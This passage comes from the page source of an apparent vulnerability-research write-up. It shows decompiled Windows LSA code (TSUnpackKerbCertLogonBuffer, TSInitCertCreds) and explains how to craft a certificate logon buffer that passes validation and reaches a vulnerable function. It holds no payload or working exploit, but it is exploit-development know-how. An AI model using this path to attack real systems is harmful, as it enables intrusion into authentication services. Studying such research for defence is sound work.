#F92672">*</span><span style="color: #F8F8F2">))TSGlobalLsaFunctions-&gt;GetCallInfo)(v30);</span></div><div class='line dim'><span style="color: #F8F8F2">    v9 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v30[</span><span style="color: #AE81FF">8</span><span style="color: #F8F8F2">];</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">a3 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Copy logon type</span></div><div class='line dim'><span style="color: #F8F8F2">    status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> ((</span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> (__fastcall </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(QWORD, </span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2">, </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">, </span><span style="color: #66D9EF">void</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">))</span></div><div class='line dim'><span style="color: #F8F8F2">            TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</span></div><div class='line dim'><span style="color: #F8F8F2">                </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">4</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">, </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">_type, v8);</span></div><div class='line dim'><span style="color: #F8F8F2">    ... </span><span style="color: #88846F">// Exit on error</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    type </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> _type;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    v12 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v9 </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">40</span><span style="color: #F8F8F2">;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Handle logon types</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (type </span><span style="color: #F92672">==</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2">)</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #88846F">// Unpack kerberos password logon buffer</span></div><div class='line dim'><span style="color: #F8F8F2">        ...</span></div><div class='line dim'><span style="color: #F8F8F2">    &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">else</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (type </span><span style="color: #F92672">==</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">D</span><span style="color: #F8F8F2">)</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #88846F">// Unpack kerberos certificate logon buffer</span></div><div class='line highlight'><span style="color: #F8F8F2">        v16 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSUnpackKerbCertLogonBuffer</span><span style="color: #F8F8F2">(</span></div><div class='line highlight'><span style="color: #F8F8F2">            v12 </span><span style="color: #F92672">!=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">,</span></div><div class='line highlight'><span style="color: #F8F8F2">            (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)v8,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">username,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">domain,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">password,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">certData,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">certLen,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v22,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v34);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">        _certData </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> certData;</span></div><div class='line dim'><span style="color: #F8F8F2">        ... </span><span style="color: #88846F">// Cleanup on error</span></div><div class='line dim'><span style="color: #F8F8F2">        _certLen </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> certLen;</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">goto</span><span style="color: #F8F8F2"> LABEL_14;</span></div><div class='line dim'><span style="color: #F8F8F2">    &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">else</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #88846F">// Unpack auth ID logon buffer</span></div><div class='line dim'><span style="color: #F8F8F2">        ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">LABEL_14:</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Decode password secret if available</span></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">LABEL_19:</span></div><div class='line dim'><span style="color: #F8F8F2">    ... </span><span style="color: #88846F">// Certificate check in Certificate Store (not relevant)</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (pCertContext </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> _certLen)</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line highlight'><span style="color: #F8F8F2">        status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSInitCertCreds</span><span style="color: #F8F8F2">(</span></div><div class='line highlight'><span style="color: #F8F8F2">            pCertContext,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">username,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">password,</span></div><div class='line highlight'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">domain,</span></div><div class='line highlight'><span style="color: #F8F8F2">            _certData,</span></div><div class='line highlight'><span style="color: #F8F8F2">            _certLen,</span></div><div class='line highlight'><span style="color: #F8F8F2">            a3);</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">LABEL_30:</span></div><div class='line dim'><span style="color: #F8F8F2">        .. </span><span style="color: #88846F">// Cleanup</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">goto</span><span style="color: #F8F8F2"> LABEL_32;</span></div><div class='line dim'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">LABEL_32:</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Cleanup on failure</span></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> status;</span></div><div class='line dim'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre>`,Fs,nl,Vl="In the second highlighted section, the code calls <code>TsInitCertCreds</code>. To reach this call, one of two conditions must be met:",Rs,ls,jl="<li>A valid certificate is found in the Microsoft certificate store for the specified user, <strong>or</strong></li> <li>Custom certificate data is provided in the <strong>pAuthData user buffer</strong>.</li>",As,el,zl="The latter approach offers greater flexibility, but the custom data must first pass the validations enforced by <code>TSUnpackKerbCertLogonBuffer</code> before the <code>certData</code> and <code>certLen</code> variables are populated.",Os,Z,Gl='<a href="#crafting-a-valid-packed-kerbcertlogonbuffer">Crafting a valid packed KerbCertLogonBuffer</a>',Cs,al,ql="<code>TSUnpackKerbCertLogonBuffer</code> function is responsible for validating the structure of the logon buffer. Primarly, it expects 3 <code>UNICODE_STRING</code> structures as input, denoted by <strong>username</strong>, <strong>domain name</strong> and <strong>password</strong>, and 2 output arguments for the certificate data (buffer pointer and its size).",ol,Kl,Ql=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> __fastcall </span><span style="color: #A6E22E">TSUnpackKerbCertLogonBuffer</span><span style="color: #F8F8F2">(</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">a1</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">buffer</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">__username</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">__domain</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">__password</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">**</span><span style="color: #FD971F">cert</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">certSize</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">void</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">**</span><span style="color: #FD971F">a8</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">a9</span><span style="color: #F8F8F2">)</span></div><div class='line dim'><span style="color: #F8F8F2">&#123;</span></div><div class='line dim'><span style="color: #F8F8F2">  ... </span><span style="color: #88846F">// Variables declaration and initialization</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( a1 )</span></div><div class='line dim'><span style="color: #F8F8F2">  &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line dim'><span style="color: #F8F8F2">  &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">  </span><span style="color: #F92672">else</span></div><div class='line dim'><span style="color: #F8F8F2">  &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">    status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> ((</span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> (__fastcall </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(QWORD, </span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2">, </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">, </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</span></div><div class='line dim'><span style="color: #F8F8F2">            </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">            </span><span style="color: #AE81FF">72</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">            </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v31,</span></div><div class='line dim'><span style="color: #F8F8F2">            buffer);</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line dim'><span style="color: #F8F8F2">      </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> status;</span></div><div class='line dim'><span style="color: #F8F8F2">    v14 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> cert_len;</span></div><div class='line dim'><span style="color: #F8F8F2">    domainLen </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> domain.Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    passwordLen </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> password.Length;</span></div><div class='line dim'><span style="color: #F8F8F2">    usernameLen </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> username.Length;</span></div><div class='line dim'><span style="color: #F8F8F2">  &#125;</span></div><div class='line highlight'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( (username.Length </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">!=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> (domain.Length </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">!=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> (password.Length </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">!=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span><span style="color: #88846F">// check unicode length</span></div><div class='line highlight'><span style="color: #F8F8F2">  &#123;</span></div><div class='line highlight'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000000D</span><span style="color: #F8F8F2">;</span></div><div class='line highlight'><span style="color: #F8F8F2">  &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">  </span><span style="color: #F92672">else</span></div><div class='line dim'><span style="color: #F8F8F2">  &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">    v18 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v14 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> ((domainLen </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> passwordLen </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> usernameLen </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">FFFFFFF8</span><span style="color: #F8F8F2">);</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( v18 </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> v14 )</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">      </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C0000095</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">    &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">else</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">      v19 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v14 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> ((domainLen </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> passwordLen </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> usernameLen </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7</span><span style="color: #F8F8F2">) </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">FFFFFFF8</span><span style="color: #F8F8F2">);</span></div><div class='line dim'><span style="color: #F8F8F2">      copy_username_buf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)</span><span style="color: #A6E22E">TSAllocate</span><span style="color: #F8F8F2">(v18);</span></div><div class='line dim'><span style="color: #F8F8F2">      </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( copy_username_buf )</span></div><div class='line dim'><span style="color: #F8F8F2">      &#123;</span></div><div class='line highlight'><span style="color: #F8F8F2">        status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> ((</span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> (__fastcall </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(QWORD, QWORD, </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">, </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</span></div><div class='line highlight'><span style="color: #F8F8F2">                </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">,</span></div><div class='line highlight'><span style="color: #F8F8F2">                username.Length,</span></div><div class='line highlight'><span style="color: #F8F8F2">                copy_username_buf,</span></div><div class='line highlight'><span style="color: #F8F8F2">                </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">buffer[username.Buffer]);</span></div><div class='line dim'><span style="color: #F8F8F2">        v21 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v19;</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line dim'><span style="color: #F8F8F2">          </span><span style="color: #F92672">goto</span><span style="color: #F8F8F2"> LABEL_17;</span></div><div class='line dim'><span style="color: #F8F8F2">        username.MaximumLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> username.Length;</span></div><div class='line dim'><span style="color: #F8F8F2">        copy_password_buf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">copy_username_buf[username.Length];</span></div><div class='line dim'><span style="color: #F8F8F2">        username.Buffer </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (UINT64)copy_username_buf;</span></div><div class='line highlight'><span style="color: #F8F8F2">        status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> ((</span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> (__fastcall </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(QWORD, QWORD, </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">, </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</span></div><div class='line highlight'><span style="color: #F8F8F2">                </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">,</span></div><div class='line highlight'><span style="color: #F8F8F2">                password.Length,</span></div><div class='line highlight'><span style="color: #F8F8F2">                copy_password_buf,</span></div><div class='line highlight'><span style="color: #F8F8F2">                </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">buffer[password.Buffer]);</span></div><div class='line dim'><span style="color: #F8F8F2">        v21 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v19;</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line dim'><span style="color: #F8F8F2">          </span><span style="color: #F92672">goto</span><span style="color: #F8F8F2"> LABEL_17;</span></div><div class='line dim'><span style="color: #F8F8F2">        password.Buffer </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (UINT64)copy_password_buf;</span></div><div class='line dim'><span style="color: #F8F8F2">        copy_domain_buf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">copy_password_buf[password.Length];</span></div><div class='line dim'><span style="color: #F8F8F2">        password.MaximumLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> password.Length;</span></div><div class='line highlight'><span style="color: #F8F8F2">        status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> ((</span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> (__fastcall </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(QWORD, QWORD, </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">, </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</span></div><div class='line highlight'><span style="color: #F8F8F2">                </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">,</span></div><div class='line highlight'><span style="color: #F8F8F2">                domain.Length,</span></div><div class='line highlight'><span style="color: #F8F8F2">                copy_domain_buf,</span></div><div class='line highlight'><span style="color: #F8F8F2">                </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">buffer[domain.Buffer]);</span></div><div class='line dim'><span style="color: #F8F8F2">        v21 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v19;</span></div><div class='line highlight'><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span></div><div class='line highlight'><span style="color: #F8F8F2">          </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> (domain.MaximumLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> domain.Length,</span></div><div class='line highlight'><span style="color: #F8F8F2">              domain.Buffer </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (UINT64)copy_domain_buf,</span></div><div class='line highlight'><span style="color: #F8F8F2">              copy_cert_buf </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2">)</span><span style="color: #F92672">&</span><span style="color: #F8F8F2">copy_domain_buf[domain.Length </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7</span><span style="color: #F8F8F2">] </span><span style="color: #F92672">&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">FFFFFFFFFFFFFFF8</span><span style="color: #F92672">uLL</span><span style="color: #F8F8F2">,</span></div><div class='line highlight'><span style="color: #F8F8F2">              status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> ((</span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> (__fastcall </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(QWORD, QWORD, </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2">, </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">))TSGlobalLsaFunctions-&gt;CopyFromClientBuffer)(</span></div><div class='line highlight'><span style="color: #F8F8F2">                      </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">,</span></div><div class='line highlight'><span style="color: #F8F8F2">                      cert_len,</span></div><div class='line highlight'><span style="color: #F8F8F2">                      copy_cert_buf,</span></div><div class='line highlight'><span style="color: #F8F8F2">                      </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">buffer[cert_offset]),</span></div><div class='line highlight'><span style="color: #F8F8F2">              v21 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v19,</span></div><div class='line highlight'><span style="color: #F8F8F2">              v13 </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">) )</span></div><div class='line dim'><span style="color: #F8F8F2">        &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">LABEL_17:</span></div><div class='line dim'><span style="color: #F8F8F2">          ... </span><span style="color: #88846F">// Cleanup</span></div><div class='line dim'><span style="color: #F8F8F2">        &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">else</span></div><div class='line dim'><span style="color: #F8F8F2">        &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">          ... </span><span style="color: #88846F">// Variable assignments</span></div><div class='line dim'><span style="color: #F8F8F2">        &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">      &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">      </span><span style="color: #F92672">else</span></div><div class='line dim'><span style="color: #F8F8F2">      &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000009A</span><span style="color: #F8F8F2">;</span></div><div class='line dim'><span style="color: #F8F8F2">      &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">    &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">  &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> status;</span></div><div class='line dim'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre>`,rs,tl,Yl="The <strong>Unicode string check</strong> ensures that the buffers’ data must contain an even number of bytes. Subsequent calls to the <code>CopyFromClientBuffer</code> LSA function will copy data from a Unicode structure buffer at a specific offset within the <code>pAuthData</code> buffer. This operation overwrites the original offset with a pointer to a buffer that contains the copied data. Overall, the logon buffer format should look like this:",Ns,q,Zl,is,Us,Xl='<a href="#reaching-the-vulnerable-function">Reaching the vulnerable function</a>',ks,pl,Jl="Now, that a valid buffer is constructed, <code>TsInitCertCred</code> is called, and a new set of validations is performed.",Fl,sn,ln=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> __fastcall </span><span style="color: #A6E22E">TSInitCertCreds</span><span style="color: #F8F8F2">(</span></div><div class='line dim'><span style="color: #F8F8F2">        PCCERT_CONTEXT </span><span style="color: #FD971F">pCert</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">username</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">password</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">domain</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">certData</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">certLen</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">        TS_PRIMARY_CREDENTIAL </span><span style="color: 